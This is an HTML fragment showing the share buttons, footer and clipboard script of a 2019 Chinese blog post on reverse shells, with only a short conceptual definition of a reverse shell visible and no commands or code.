+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&title=渗透技术基础之反弹shell详解"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&title=渗透技术基础之反弹shell详解"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&title=渗透技术基础之反弹shell详解"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&title=渗透技术基础之反弹shell详解"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&name=渗透技术基础之反弹shell详解&description=&lt;h3 id=&#34;反弹shell介绍&#34;&gt;&lt;a href=&#34;#反弹shell介绍&#34; class=&#34;headerlink&#34; title=&#34;反弹shell介绍&#34;&gt;&lt;/a&gt;反弹shell介绍&lt;/h3&gt;&lt;p&gt;在渗透测试中发现一个命令执行漏洞，我们可以利用反弹shell获取对目标主机的控制权。&lt;/p&gt;
+&lt;p&gt;反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/&t=渗透技术基础之反弹shell详解"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Six
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
